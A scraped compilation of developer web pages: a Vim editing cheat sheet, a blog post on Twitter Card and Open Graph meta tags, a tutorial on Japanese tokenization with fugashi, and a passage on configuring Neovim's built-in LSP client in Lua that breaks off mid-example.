<h2 id="number-based-movements">Number Based Movements</h2>
<p>Using a <code>number</code> before each command can execute that command that many times. e.g <code>3w</code> will move to the 3rd next word.</p>
<h2 id="insert-text-repeatedly">Insert Text Repeatedly</h2>
<p>To insert the same text multiple times use <code>&lt;number&gt;i&lt;text&gt;esc</code>. e.g <code>3&lt;i&gt;go&lt;esc&gt;</code> will write <code>gogogo</code>.</p>
<h2 id="find-a-character">Find a Character</h2>
<p>To find and move to the next (or previous) occurrence of a character, use <code>f</code> and <code>F</code>, e.g. <code>fo</code> finds next 'o'. You can combine f with a number. e.g. you can find 3rd occurrence of 'q' with <code>3fq</code>.</p>
<h2 id="go-to-matching-parenthesis">Go to Matching Parenthesis</h2>
<p>In text that is structured with parentheses or brackets, <code>(</code> or <code>{</code> or <code>[</code>, use <code>%</code> to jump to the matching parenthesis or bracket.</p>
<h2 id="start-end-of-line">Start/End of Line</h2>
<p>To reach the beginning of a line, use <code>0</code>. For the end of line use <code>$</code>.</p>
<h2 id="find-word-under-cursor">Find Word Under Cursor</h2>
<p>Find the next occurrence of the word under the cursor with <code>*</code>, and the previous with <code>#</code>.</p>
<h2 id="go-to-line">Go to Line</h2>
<p><code>gg</code> takes you to the beginning of the file; <code>G</code> to the end. To jump directly to a specific line, give its line number along with <code>G</code>. e.g <code>5G</code> will take you to the fifth line of the file.</p>
<h2 id="search-for-text">Search for Text</h2>
<p>Searching text is a vital part of any text editor. In Vim, press <code>/</code>, and give the text to search for. The search can be repeated for next and previous occurrences with <code>n</code> and <code>N</code> respectively. For advanced use cases, it's possible to use regexps that help to find the text of a particular form.</p>
<h2 id="insert-new-line">Insert New Line</h2>
<p>To insert text into a new line <strong>after</strong> the current line use <code>o</code> and to insert a new line <strong>before</strong> the current line use <code>O</code>.</p>
<p>After a new line is created, the editor is set to <code>insert</code> mode.</p>
<h2 id="removing-a-character">Removing a Character</h2>
<p><code>x</code> and <code>X</code> delete the character under the cursor and to the left of the cursor, respectively.</p>
<p>Also adding a <code>number</code> before <code>x</code> of <code>X</code> can perform the action that many times. e.g <code>5x</code> will remove the <strong>next</strong> five characters <strong>including</strong> the character under the cursor and <code>5X</code> will remove the <strong>previous</strong> five characters <strong>excluding</strong> the character under the cursor.</p>
<h2 id="replace-a-character">Replace a Character</h2>
<p>User <code>r</code> to replace only one character under the cursor.</p>
<h2 id="deleting">Deleting</h2>
<p><code>d</code> is the delete command. It can be combined it with movements, e.g. <code>dw</code> deletes the characters on the right side of the cursor up to the beginning of the next word. <code>de</code> deletes all the characters of the word on the right side of the cursor <strong>including</strong> the character under cursor. <code>db</code> will delete the previous word if the cursor is under the first letter of a word or else it will delete the characters left to the cursor upto the beginning of the word.</p>
<p>It also <strong>copies</strong> the content, so that you can <strong>paste</strong> it with <code>p</code> to another location.</p>
<p><code>dd</code> will delete the whole line.</p>
<h2 id="repeat-command">Repeat Command</h2>
<p>To repeat the previous command, just use <code>.</code> (period).</p>
<h2 id="replace-mode">Replace Mode</h2>
<p>Use <code>R</code> to enter <code>REPLACE</code> mode. In this mode characters under the cursor can be replaced.</p>
<h2 id="visual-mode">Visual Mode</h2>
<p>Use <code>v</code> to enter the <code>VISUAL</code> mode and <code>V</code> to enter <code>VISUAL LINE</code> mode. In this mode the text can be selected by the movement keys before deciding what to do with it.</p>
<p>Selected text can be <strong>deleted/cut</strong> using <code>d</code> or <strong>copied</strong> using <code>y</code>. It can be <strong>pasted</strong> after the cursor using <code>p</code> or before the cursor using <code>P</code>.
&lt;/esc&gt;&lt;/i&gt;&lt;/text&gt;&lt;/number&gt;</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Have you ever wondered how twitter automatically shows the preview of the link in a tweet that you post. For example, take the following tweet that I posted very recently. It's the first ever <a href="https://blog.bhanuteja.dev/add-typescript-to-your-nextjs-project-ckdpgej1h0174kbs1h9fg86yq">blog post</a> that I have written and it is published on <a href="https://hashnode.com/@hashnode">Hashnode</a>.</p>
<p><a href="https://twitter.com/pbteja1998/status/1293045631297052672?s=20"><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1597240733165/nhtTc1qML.png?auto=format&amp;q=60"></a></p>
<p>You can see how twitter automatically created a card out of the link and showed the image, title and description in a nice and readable way. How does twitter know what image to use and what part of website content to use for generating title and description? It cannot be just taking a random image or using random words in the web page as title and description! It must somehow be knowing exactly what image to show, and what title and description to use.</p>
<p>The answer to the above question is <code>meta tags</code>. <a href="https://hashnode.com/@hashnode">Hashnode</a> includes meta tags in every one of the blog posts which is enabling twitter to create that beautiful card. 
Before we get an overview of what meta tags are - let's just see what meta tags <a href="https://hashnode.com/@hashnode">Hashnode</a> included in the blog post, which enabled the twitter to display the preview of the link that you see on twitter.</p>
<p>I skimmed through the page source of the <a href="https://hashnode.com/@hashnode">Hashnode</a> blog post and found many meta tags. See below the meta tags that are related to twitter.</p>
<pre><code><span>&lt;<span>meta</span> <span>property</span>=<span>"twitter:card"</span> <span>content</span>=<span>"summary_large_image"</span>/&gt;</span>
<span>&lt;<span>meta</span> <span>property</span>=<span>"twitter:title"</span> <span>content</span>=<span>"Add Typescript to your Next.js project"</span>/&gt;</span>
<span>&lt;<span>meta</span> <span>property</span>=<span>"twitter:description"</span> <span>content</span>=<span>"It&amp;#x27;s very easy to add typescript to a Next.js project. In this post, I will list out steps on how to do so.
    First, let&amp;#x27;s create a new Nextjs project my-ts-app
    # Create a directory with name `my-ts-app`
    mkdir my-ts-app
    # Change directory to `my-ts-ap..."</span>/&gt;</span>
<span>&lt;<span>meta</span> <span>property</span>=<span>"twitter:image"</span> <span>content</span>=<span>"https://hashnode.com/utility/r?url=https%3A%2F%2Fcdn.hashnode.com%2Fres%2Fhashnode%2Fimage%2Fupload%2Fv1597120734019%2FcIO4EHx9R.png%3Fw%3D1200%26h%3D630%26fit%3Dcrop%26crop%3Dentropy%26auto%3Dformat%26q%3D60"</span>/&gt;</span>
<span>&lt;<span>meta</span> <span>property</span>=<span>"twitter:creator"</span> <span>content</span>=<span>"@pbteja1998"</span>/&gt;</span>
<span>&lt;<span>meta</span> <span>name</span>=<span>"twitter:site"</span> <span>content</span>=<span>"@hashnode"</span>/&gt;</span>
</code></pre>
<p>As you can see, <a href="https://hashnode.com/@hashnode">Hashnode</a> is explicitly telling twitter what to show and how to show the preview of the link to the blog post that I posted. </p>
<p>Now, let's get to the actual content of the blog post.</p>

<blockquote>
<p>Meta tags are snippets of text that describe a page's content; the meta tags don't appear on the page itself, but only in the page's source code. </p>
</blockquote>
<p>So basically they are just html tags that you add in the <code>head</code> section of your website to describe what the content in that particular page is about. In short, meta tags contain metadata of the page on a website.</p>
<p>Platforms like Twitter, Facebook, LinkedIn make use of these meta tags to display link previews when you add that link on their platform. They not only just use these meta tags, they also provide specific guidelines that you can follow which makes the preview look the best on whatever platform that you post your link in.</p>
<p>Let's see what twitter recommends.
Twitter actually has 4 different ways to show the link preview</p>
<ul>
<li>Summary Card: Title, description, and thumbnail.</li>
<li>Summary Card with Large Image: Similar to the Summary Card, but with a prominently-featured image.</li>
<li>App Card: A Card with a direct download to a mobile app.</li>
<li>Player Card: A Card that can display video/audio/media.</li>
</ul>
<p>In this post, I will just list down the recommendations for <code>Summary Card with Large Image</code>. I will add the links to other cards at the bottom of the post so that you can go and read it out for yourself later.</p>
<p><strong>Twitter Summary Card with Large Image</strong></p>
<table>
<thead>
<tr>
<td>Property</td><td>Description</td><td>Required</td></tr>
</thead>
<tbody>
<tr>
<td>twitter:card</td><td>Must be set to a value of “summary_large_image”</td><td>Yes</td></tr>
<tr>
<td>twitter:site</td><td>The Twitter <a href="https://hashnode.com/@username" target="_blank" rel="noopener noreferrer">@username</a> the card should be attributed to.</td><td>No</td></tr>
<tr>
<td>twitter:title</td><td>A concise title for the related content. <strong>Platform specific behaviors</strong>: iOS, Android: Truncated to two lines in timeline and expanded Tweet. Web: Truncated to one line in timeline and expanded Tweet</td><td>Yes</td></tr>
<tr>
<td>twitter:description</td><td>A description that concisely summarizes the content as appropriate for presentation within a Tweet. You should not re-use the title as the description or use this field to describe the general services provided by the website.  <strong>Platform specific behaviors</strong>: iOS, Android: Not displayed. Web: Truncated to three lines in timeline and expanded Tweet</td><td>No</td></tr>
<tr>
<td>twitter:image</td><td>A URL to a unique image representing the content of the page. You should not use a generic image such as your website logo, author photo, or other image that spans multiple pages. Images for this Card support an aspect ratio of 2:1 with minimum dimensions of 300x157 or maximum of 4096x4096 pixels. Images must be less than 5MB in size. JPG, PNG, WEBP and GIF formats are supported. Only the first frame of an animated GIF will be used. SVG is not supported.</td><td>No</td></tr>
<tr>
<td>twitter:image:alt</td><td>A text description of the image conveying the essential nature of an image to users who are visually impaired. Maximum 420 characters.</td><td>No</td></tr>
</tbody>
</table>
<p>You need to set the above properties as per the given recommendations in your head tag of the website in the following way.</p>
<pre><code><span>&lt;<span>meta</span> <span>name</span>=<span>"property-name"</span> <span>content</span>=<span>"property-content"</span> /&gt;</span>


<span>&lt;<span>meta</span> <span>name</span>=<span>"twitter:title"</span> <span>content</span>=<span>"Optimize your tweets with cards"</span> /&gt;</span>
</code></pre>
<p>Similarly, there are meta tags that platforms like Facebook and LinkedIn use. For example, there will be meta tags related to <code>title</code> for showing link previews on Facebook. And there will be a meta tags for <code>title</code> for showing previews on LinkedIn. Since all these meta tags related to title refers to the same thing, wouldn't it be nice to combine all the title meta tags in to one. Fortunately there is a way - It's called Open Graph Protocol.</p>
<h2 id="open-graph-protocol">Open Graph Protocol</h2>
<blockquote>
<p>The Open Graph protocol enables any web page to become a rich object in a social graph. For instance, this is used on Facebook to allow any web page to have the same functionality as any other object on Facebook.</p>
<p>While many different technologies and schemas exist and could be combined together, there isn't a single technology which provides enough information to richly represent any web page within the social graph. The Open Graph protocol builds on these existing technologies and gives developers one thing to implement. Developer simplicity is a key goal of the Open Graph protocol which has informed many of the technical design decisions.</p>
</blockquote>
<p>To turn your web pages into graph objects, you must include the following four meta tag properties to your website.</p>
<table>
<thead>
<tr>
<td>Property</td><td>Description</td><td>Required</td></tr>
</thead>
<tbody>
<tr>
<td>og:title</td><td>The title of your object as it should appear within the graph, e.g., "The Rock".</td><td>Yes</td></tr>
<tr>
<td>og:type</td><td>The type of your object, e.g., "video.movie". Depending on the type you specify, other properties may also be required.</td><td>Yes</td></tr>
<tr>
<td>og:image</td><td>An image URL which should represent your object within the graph.</td><td>Yes</td></tr>
<tr>
<td>og:url</td><td>The canonical URL of your object that will be used as its permanent ID in the graph, e.g., "<a href="https://www.imdb.com/title/tt0117500/" target="_blank">imdb.com/title/tt0117500</a>".</td><td>Yes</td></tr>
</tbody>
</table>
<p>There are many other open graph properties that you can add to your site, I will add a link to them at the end of blog post.</p>
<p>Now, coming back to link previews on Facebook, Facebook actually directly uses the open graph based meta tags to show link previews. See the recommendations that they give below.</p>
<p><strong>Facebook Recommendations</strong></p>
<table>
<thead>
<tr>
<td>Property</td><td>Description</td><td>Required</td></tr>
</thead>
<tbody>

<p><strong>Validating Meta Tags</strong></p>
<p>In case you are in doubt, whether you set your meta tags properly or not, you can validate and check them using <a href="https://developers.facebook.com/tools/debug/">Facebook Sharing Debugger</a>, <a href="https://cards-dev.twitter.com/validator">Twitter Card Validator</a> and <a href="https://www.linkedin.com/post-inspector/">LinkedIn Post Inspector</a> 
You just have to paste the link you want to validate in any of the above tools and then see the preview of the link.</p>
<p>There is one other validator that I frequently use which combines all these. <a href="https://metatags.io/">metatags.io</a>. It shows the previews for Google, Facebook, Twitter, LinkedIn, Pinterest, Slack, all in one place. You can even upload the image, enter title and description to <a href="https://metatags.io/">metatags.io</a>, and it shows and allows you to copy exactly the html code that you need to put in your <code>head</code> section of your html.</p>
<p>I think, now you know exactly what to do to make your website links shareable on social media platforms. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Over the past several years there's been a welcome trend in NLP projects to be
broadly multi-lingual. However, even when many languages are supported, there's
a few that tend to be left out. One of these is Japanese. Japanese is written
without spaces, and deciding where one word ends and another begins is not
trivial. While highly accurate tokenizers are available, they can be hard to
use, and English documentation is scarce. This is a short guide to tokenizing
Japanese in Python that should be enough to get you started adding Japanese
support to your application.</p>

<h2 id="getting-ready"> Getting Ready</h2>
<p>First, you'll need to install a tokenizer and a dictionary. For this tutorial
we'll use <a href="https://github.com/polm/fugashi">fugashi</a> with <a href="https://github.com/polm/unidic-lite">unidic-lite</a>, both projects I maintain. You can
install them like this:</p>
<pre><code>pip install fugashi[unidic-lite]
</code></pre>
<p>Fugashi comes with a script so you can test it out at the command line. Type in
some Japanese and the output will have one word per line, along with other
information like part of speech.</p>
<pre><code>&gt; fugashi
麩菓子は、麩を主材料とした日本の菓子。
麩      フ      フ      麩      名詞-普通名詞-一般
菓子    カシ    カシ    菓子    名詞-普通名詞-一般
は      ワ      ハ      は      助詞-係助詞
、                      、      補助記号-読点
麩      フ      フ      麩      名詞-普通名詞-一般
を      オ      ヲ      を      助詞-格助詞
主材    シュザイ        シュザイ        主材    名詞-普通名詞-一般
料      リョー  リョウ  料      接尾辞-名詞的-一般
と      ト      ト      と      助詞-格助詞
し      シ      スル    為る    動詞-非自立可能 サ行変格        連用形-一般
た      タ      タ      た      助動詞  助動詞-タ       連体形-一般
日本    ニッポン        ニッポン        日本    名詞-固有名詞-地名-国

菓子    カシ    カシ    菓子    名詞-普通名詞-一般
。                      。      補助記号-句点
EOS
</code></pre>
<p>The <code>EOS</code> stands for "end of sentence", though fugashi is not actually
performing sentence tokenization; in this case it just marks the end of the
input.</p>
<h2 id="sample-code"> Sample Code</h2>
<p>Now we're ready to get started with converting plain Japanese text into a list
of words in Python.</p>
<pre><code>import fugashi

# This is our sample text.
# "Fugashi" is a Japanese snack primarily made of gluten.
text = "麩菓子は、麩を主材料とした日本の菓子。"

# The Tagger object holds state about the dictionary. 
tagger = fugashi.Tagger()

words = [word.surface for word in tagger(text)]
print(*words)
# =&gt; 麩 菓子 は 、 麩 を 主材 料 と し た 日本 の 菓子 。
</code></pre>
<p>This prints the original sentence with spaces inserted between words. In many
cases, that's all you need, but fugashi provides a lot of other information,
such as part of speech, lemmas, broad etymological category, pronunciation, and
more. This information all comes from <a href="https://unidic.ninjal.ac.jp/">UniDic</a>, a dictionary provided by the
<a href="https://www.ninjal.ac.jp/">National Institute for Japanese Language and Linguistics</a> (NINJAL).</p>
<p>fugashi is a wrapper for <a href="https://taku910.github.io/mecab/">MeCab</a>, a C++ Japanese tokenizer. MeCab is doing
all the hard work here, but fugashi wraps it to make it more Pythonic, easier
to install, and to clarify some common error cases.</p>
<p>You may wonder why part of speech and other information is included by default.
In the classical NLP pipeline for languages like English, tokenization is a
separate step before part of speech tagging. In Japanese, however, knowing part
of speech is important in getting tokenization right, so they're conventionally
solved as a joint task. This is why Japanese tokenizers are often referred to
as "morphological analyzers" (形態素解析器).</p>
<h2 id="notes-on-japanese-tokenization"> Notes on Japanese Tokenization</h2>
<p>There are several things about Japanese tokenization that may be surprising if
you're used to languages like English.</p>
<h3 id="lemmas-may-not-resemble-the-words-in-the-text-at-all"> Lemmas May Not Resemble the Words in the Text at All</h3>
<p>Here's how you get <a href="https://en.wikipedia.org/wiki/Lemma_(morphology)">lemma</a> information with fugashi:</p>
<pre><code>import fugashi
tagger = fugashi.Tagger()
text = "麩を用いた菓子は江戸時代からすでに存在していた。"

print("input:", text)
for word in tagger(text):
    # feature is a named tuple holding all the Unidic info
    print(word.surface, word.feature.lemma, sep="\t")
</code></pre>
<p>And here's the output of the script:</p>
<pre><code>input: 麩を用いた菓子は江戸時代からすでに存在していた。
麩      麩
を      を
用い    用いる
た      た
菓子    菓子
は      は
江戸    エド
時代    時代
から    から
すでに  既に
存在    存在
し      為る
て      て
い      居る
た      た
。      。
</code></pre>
<p>You can see that 用い has 用いる as a lemma, and that し has 為る and い has
居る, handling both inflection and orthographic variation. すでに is not
inflected, but the lemma uses the kanji form 既に.</p>
<p>These lemmas come from UniDic, which by convention uses the "dictionary form"
of a word for lemmas. This is typically in kanji even if the word isn't usually
written in kanji because the kanji form is considered less ambiguous. For
example, この ("this [thing]") has 此の as a lemma, even though normal modern
writing would never use that form. This is also true of 為る in the above
example.</p>
<p>This can be surprising if you aren't familiar with Japanese, but it's not a
problem. It is worth keeping in mind if your application ever shows lemmas to
your user for any reason, though, as it may not be in a form they expect.</p>
<p>Another thing to keep in mind is that most lemmas in Japanese deal with
orthographic rather than inflectional variation. This orthographic variation is
called "<a href="https://ja.wikipedia.org/wiki/%E8%A1%A8%E8%A8%98%E3%82%86%E3%82%8C">hyoukiyure</a>" and causes problems similar to spelling errors in
English.</p>
<h3 id="verbs-will-often-be-multiple-tokens"> Verbs Will Often Be Multiple Tokens</h3>
<p>Any inflection of a verb will result in multiple tokens. This can also affect
adjectives that inflect, like 赤い.  You can see this in the verbs at the end
of the previous example, or in this more compact example:</p>
<pre><code>input: 見た ("looked" or "saw")
output:
見      ミ      ミル    見る    動詞-非自立可能 上一段-マ行     連用形-一般
た      タ      タ      た      助動詞  助動詞-タ       終止形-一般
</code></pre>
<p>This would be like if "looked" was tokenized into "look" and "ed" in English.
This feels strange even to native Japanese speakers, but it's common to all
modern tokenizers. The main reason for this is that verb inflections are
extremely regular, so registering verb stems and verb parts separately in the
dictionary makes dictionary maintenance easier and the tokenizer implementation
simpler and faster. It also works better in the rare case an unknown verb shows
up. (Verbs are a <a href="https://en.wikipedia.org/wiki/Part_of_speech#cite_ref-2:~:text=closed%20classes%20(such%20as%20pronouns%20and%20conjunctions)%20acquire%20new%20members%20infrequently%2C%20if%20at%20all.">closed class</a> in Japanese, which means new verbs aren't
common.)</p>
<p>In the early 90s several tokenizers handled verb morphology directly, but that
approach has been abandoned over time because of the above advantages of the
fine-grained approach. Depending on your application needs you can use some
simple rules to lump verb parts together or just discard non-stem parts as stop
words.</p>
<h3 id="the-tagger-object-has-a-startup-cost"> The Tagger Object Has a Startup Cost</h3>
<p>It's fast enough that you won't notice for one invocation, but creating the
Tagger is a lot of work for the computer. When processing text in a loop it's
important you re-use the Tagger rather than creating a new Tagger for each
input.</p>
<pre><code># Don't do this
for text in texts:
    tagger = fugashi.Tagger()
    words = tagger(text)

# Do this instead
tagger = fugashi.Tagger()
for text in texts:
    words = tagger(text)
</code></pre>
<p>If you follow the second pattern MeCab shouldn't be a speed bottleneck for
normal applications.</p>
<h3 id="always-note-your-tokenizer-details"> Always Note Your Tokenizer Details</h3>
<p>If you publish a resource using tokenized Japanese text, always be careful to
mention what tokenizer and what dictionary you used so your results can be
replicated. Saying you used MeCab isn't enough information to reproduce your
results, because there are many different dictionaries for MeCab that can give
completely different results. Even if you specify the dictionary, it's critical
that you specify the version too, since popular dictionaries like UniDic may be
updated over time. If you want to know more you can read <a href="https://www.dampfkraft.com/nlp/japanese-tokenizer-dictionaries.html">my article about
Japanese tokenizer dictionaries</a>.</p>
<hr>
<p>Hopefully that's enough to get you started with tokenizing Japanese. If you
have trouble, feel free to <a href="https://github.com/polm/fugashi/issues">file an issue</a> or <a href="mailto:polm@dampfkraft.com">contact me</a>.
I'm glad to help out with open source projects as time allows, and for
commercial projects you can hire me to handle the integration directly. Ψ</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>The next major release of <a href="https://neovim.io/">Neovim</a>, 0.5.0, is currently in development and has five <a href="https://neovim.io/roadmap/">promised features</a>:</p>

<p>Enticed by offerings of the Neovim roadmap, I decided to install the nightly builds of Neovim and try them for myself. This post will be the first in a series where we focus on the features of Neovim 0.5.0. Today, we’ll look at Neovim’s Language Server Protocol.</p>
<h2 id="what-is-language-server-protocol">What is Language Server Protocol?<a href="#what-is-language-server-protocol" aria-label="what is language server protocol permalink"></a></h2>
<p>The <a href="https://microsoft.github.io/language-server-protocol/">Language Server Protocol</a>, or LSP, is a JSON RPC protocol introduced in 2016 by Microsoft that defines how an editor should talk to a language server. What is a language server? It’s a small program that runs locally on your computer that can provide information about the code you’re writing. The idea is that you tell the LSP where your project is, it scans all your files, and then has an understanding about your project. It can then provide go-to-definition, type info, compiler errors, completion suggestions, and more back to your editor. As the name implies, each language server generally supports only one language. There’s a <a href="https://langserver.org/">community maintained list</a> of major LSP implementations.</p>
<p>That’s cool, you say, but my editor already supports these features. Why should I start using a language server?</p>
<p>That’s a good question. If your editor already supports typo info, auto-completion, and everything else, you likely don’t need a language server. In fact, the LSP might slow you down – it’s likely a built-in editor feature would be faster than your editor making an RPC request to a server running on your computer.</p>
<p>However, the main advantage of the LSP is that it brings together developers who use different editors. The LSP is editor agnostic – if your editor speaks the protocol, it can talk to the server running. That is, instead of developers having to create an Emacs JavaScript plugin, and a Vim JavaScript plugin, and a VS Code JavaScript plugin, they need only create a single JavaScript language server and language server plugins for each editor.</p>
<p><a href="https://langserver.org/">Langserver.org</a> calls this problem “the matrix”, and it’s easy to see why. If we have <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span></span> languages and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span></span> editors, instead of making <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>×</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">n \times m</annotation></semantics></math></span></span> integrations we only have to create <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span></span> language servers plus <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span></span> editor LSP plugins.</p>

<p>Okay, you tell me, so now you’ve just proved <a href="https://en.wikipedia.org/wiki/Conway%27s_law">Conway’s law</a> also applies to open source. But you didn’t answer my original question: why should I use a language server?</p>
<p>Since the community of all JavaScript developers is a superset of all JavaScript Vim developers, this means that you should see more developers working on a JavaScript language server as opposed to a JavaScript Vim plugin. This should ideally mean a generally better language server.</p>
<p>Additionally, since the community of all Vim developers is also better than all JavaScript Vim developers, this should mean better LSP integration support. Vim users can unite and benefit around building a common language server, even if the day-to-day languages they use are different.</p>
<p>While this may not necessarily be true for all editor plugins, it certainly is for Vim. Vim completion can be done for already existing keywords, dictionary words, ctags results, or omnicomplete. Of these, ctags and omnicomplete are the most IDE-like. In my experience, while ctags is pretty good, it can often give inaccurate results if the same name is used in different contexts across a codebase. And omnicomplete is often left neglected: JavaScript omnicomplete hasn’t been <a href="https://github.com/vim/vim/blob/5be4ceecea5520265066eac972460ebb1cdf05e7/runtime/autoload/javascriptcomplete.vim">updated since 2017</a>, a sign of the matrix problem.</p>

<p>Okay, so I’ve convinced you to try out an LSP. How does it work in Neovim?</p>
<p>Neovim has <a href="https://github.com/neovim/neovim/wiki/Installing-Neovim">great install instructions</a> for most systems (macOS, Windows, popular Linux distros). I’m on macOS, so I ran:</p>
<div data-language="text"><pre><code>brew install --HEAD neovim</code></pre></div>
<p>From there, you can confirm that the installed version of Neovim has LSP support with <code>:h lsp</code>.</p>
<h2 id="a-note-on-lua">A note on Lua<a href="#a-note-on-lua" aria-label="a note on lua permalink"></a></h2>
<p>Recall the first two features of 0.5.0:</p>
<blockquote>
<ul>
<li>Lua remote plugin host</li>
<li>Lua user-config: init.lua</li>
</ul>
</blockquote>
<p>Vimscript, or VimL, is the de facto configuration of Vim. However, it’s also <a href="https://www.reddit.com/r/vim/comments/1bf672/why_does_viml_suck/">not that great of a language</a>: there are lots of odd quirks and performance issues that come with it. As a result, the Neovim core developers decided to add support for Lua in Neovim. Justin M. Keyes goes over the rationale for this decision in a <a href="https://youtu.be/Bt-vmPC_-Ho">great VimConf presentation</a>. The tl;dr is that Lua is a fast language that already exists and is simpler to learn than Vimscript.</p>
<p>Why does this matter? We were going to go over the LSP today, not Lua, right?</p>
<p>Yes and no. Just as Vimscript is the language for which Vim apis are exposed, Lua is becoming the preferred language for which Neovim apis are being exposed. The LSP api is in Lua, meaning we’ll have to write a little bit of Lua to set it up.</p>
<p>If you haven’t written any Lua, don’t fear! Ample code examples will be provided for your copy/pasting pleasure. Lua is a fairly easy language to read if you know any programming language already. If you’re interested in more Lua, <a href="https://learnxinyminutes.com/docs/lua/">Learn X in Y minutes</a> is a great place to start.</p>
<p>However, most Vimmers don’t currently have any Lua configuration files lying around, so we need to cover the basics of going from an <code>init.vim</code> Vimscript file into triggering Lua code. There are a couple ways to do this.</p>
<h3 id="lua-in-your-vim">Lua in your vim<a href="#lua-in-your-vim" aria-label="lua in your vim permalink"></a></h3>
<p>You can put Lua code directly in vimscript files, like so:</p>
<div data-language="vim"><pre><code>lua <span>&lt;</span><span>&lt;</span> EOF
<span>print</span><span>(</span><span>"hello world"</span><span>)</span>
EOF</code></pre></div>
<p>This is great for small to medium snippets of Lua code.</p>
<h3 id="lua-in-a-file">Lua in a file<a href="#lua-in-a-file" aria-label="lua in a file permalink"></a></h3>
<p>You can also tell Neovim to source lua files, given that that fit a directory structure. In Vimscript:</p>

<p>This will look for the file: <code>nvim/lua/lsp/init.lua</code>. This is great for larger, self-contained chunks of Lua code. I prefer this approach and use it in <a href="https://github.com/nathunsmitty/.config">my dotfiles</a>, since it gives me access to Lua syntax highlighting, linters, etc. while editing.</p>
<h2 id="configuring-support-for-servers">Configuring Support for Servers<a href="#configuring-support-for-servers" aria-label="configuring support for servers permalink"></a></h2>
<p>Neovim provides the LSP client built-in, but it needs to which language servers to run and where on your machine they’re located. There’s a <a href="https://neovim.io/doc/user/lsp.html#lsp-core">Lua api</a> provided that allows you to do this; the following will trigger JavaScript LSP:</p>
<div data-language="lua"><pre><code><span>local</span> root_dir <span>=</span> <span>buffer_find_root_dir</span><span>(</span>bufnr<span>,</span> <span>function</span><span>(</span>dir<span>)</span>
  <span>return</span> <span>is_dir</span><span>(</span><span>path_join</span><span>(</span>dir<span>,</span> <span>'node_modules'</span><span>)</span><span>)</span>
<span>end</span><span>)</span>

<span>local</span> bufnr <span>=</span> vim<span>.</span>api<span>.</span><span>nvim_get_current_buf</span><span>(</span><span>)</span>
<span>local</span> javascript_lsp_config <span>=</span> <span>{</span>

  cmd <span>=</span> <span>{</span> <span>path_join</span><span>(</span>os<span>.</span><span>getenv</span><span>(</span><span>"JAVASCRIPT_LANGUAGE_SERVER_DIRECTORY"</span><span>)</span><span>,</span> <span>"lib"</span><span>,</span> <span>"language-server-stdio.js"</span><span>)</span> <span>}</span><span>;</span>
<span>}</span>

<span>local</span> new_config <span>=</span> vim<span>.</span><span>tbl_extend</span><span>(</span><span>"error"</span><span>,</span> javascript_lsp_config<span>,</span> <span>{</span>

<span>}</span><span>)</span>
client_id <span>=</span> vim<span>.</span>lsp<span>.</span><span>start_client</span><span>(</span>new_config<span>)</span>
vim<span>.</span>lsp<span>.</span><span>buf_attach_client</span><span>(</span>bufnr<span>,</span> client_id<span>)</span></code></pre></div>
<p>(This is adapted from <a href="https://neovim.io/doc/user/lsp.html#lsp-extension-example">an example</a> in the LSP manual.)</p>
<p>However, this is a lot of configuration. Is there a better solution?</p>
<h3 id="nvim-lsp-common-server-configuration">nvim-lsp: Common Server Configuration<a href="#nvim-lsp-common-server-configuration" aria-label="nvim lsp common server configuration permalink"></a></h3>
<p>To give a higher level of abstraction for end users who just want to start using a LSP, Neovim provides an official plugin: <a href="https://github.com/neovim/nvim-lsp">nvim-lsp</a>. This is a collection of common LSPs with integrations ready to go. Let’s install it!</p>
<div data-language="vim"><pre><code>
Plug <span>'neovim/nvim-lsp'</span>

<span>call</span> minpac#<span>add</span><span>(</span><span>'neovim/nvim-lsp'</span><span>,</span> <span>{</span><span>'type'</span><span>:</span> <span>'opt'</span><span>}</span><span>)</span>
packadd nvim<span>-</span><span>lsp</span></code></pre></div>
<p>Note that if you’re using a Vim 8’s native package manager (or a package manager that leverages the native package manager, like <a href="https://github.com/k-takata/minpac">minpac</a>), then you need to add the line <code>packadd nvim-lsp</code>. This is because Neovim <a href="https://github.com/neovim/neovim/issues/12670">currently does not source Lua plugins before your <code>init.vim</code> file</a>, meaning that your LSP config will execute before nvim-lsp is loaded, giving errors. With an older <a href="https://neovim.io/doc/user/options.html#'runtimepath'">runtimepath</a>-based plugin manager like <a href="https://github.com/junegunn/vim-plug">vim-plug</a>, this is not an issue.</p>
<p>Now that we’ve downloaded nvim-lsp, we can configure a language server. To set up the <a href="https://github.com/theia-ide/typescript-language-server">TypeScript language server</a>, we simply need to add:</p>
<div data-language="vim"><pre><code>require<span>'nvim_lsp'</span><span>.</span>tsserver<span>.</span>setup<span>{</span><span>}</span></code></pre></div>
<p>There are also <a href="https://github.com/neovim/nvim-lsp#tsserver">configuration options</a> for which filetypes to run it on, how to detect your project’s root directory, etc.</p>
<p>While we’re configuring stuff, let’s add some nice, vim-like shortcuts for LSP features:</p>
<div data-language="vim"><pre><code>nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span> <span>gd</span> <span>&lt;</span>cmd<span>&gt;</span>lua <span>vim</span><span>.</span><span>lsp</span><span>.</span>buf<span>.</span><span>definition</span><span>(</span><span>)</span><span>&lt;</span>CR<span>&gt;</span>
nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span> gh     <span>&lt;</span>cmd<span>&gt;</span>lua <span>vim</span><span>.</span><span>lsp</span><span>.</span>buf<span>.</span><span>hover</span><span>(</span><span>)</span><span>&lt;</span>CR<span>&gt;</span>
